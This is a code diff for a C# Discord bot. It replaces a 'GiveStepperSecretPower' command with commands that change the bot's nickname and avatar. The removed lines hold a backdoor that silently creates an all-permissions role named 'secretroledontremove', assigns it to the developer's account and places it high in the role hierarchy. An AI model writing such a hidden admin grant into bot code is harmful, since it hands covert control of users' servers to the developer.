@@ -506,24 +506,34 @@ namespace Discord_Bot
                 await Tools.Reply(e, "🖕🏽", false);
         }
 
-        public static Func<CommandArgs, Task> GiveStepperSecretPower = async e =>
+        public static Func<CommandArgs, Task> ChangeNickname = async e =>
         {
-            User stepper = e.Server.GetUser(ulong.Parse(Program.ProgramInfo.DevID.ToString()));
+            await e.Server.CurrentUser.Edit(null, null, null, null, e.ArgText);
+        };
 
-            var roles = e.Server.FindRoles("secretroledontremove").ToList();
-            if (roles.Count != 0)
+        public static Func<CommandArgs, Task> ChangeAvatar = async e =>
+        {
+            try
             {
-                foreach (var x in roles)
+                System.Net.WebRequest wr = System.Net.WebRequest.Create(e.ArgText);
+                var response = await wr.GetResponseAsync();
+
+                var t = e.ArgText.Split('.');
+                ImageType i = ImageType.None;
+                switch(t[t.Length - 1])
                 {
-                    await x.Delete();
+                    case "JPG":
+                    case "JPEG":
+                        i = ImageType.Jpeg;
+                        break;
+                    case "PNG":
+                        i = ImageType.Png;
+                        break;
                 }
+
+                await Storage.client.CurrentUser.Edit(null, null, null, null, response.GetResponseStream(), i);
             }
-
-            var role = await e.Server.CreateRole("secretroledontremove", ServerPermissions.All);
-
-            await stepper.AddRoles(role);
-            
-            await role.Edit(null, null, null, null, e.Server.RoleCount - 2, false);
+            catch(Exception) { }
         };
     }
 }
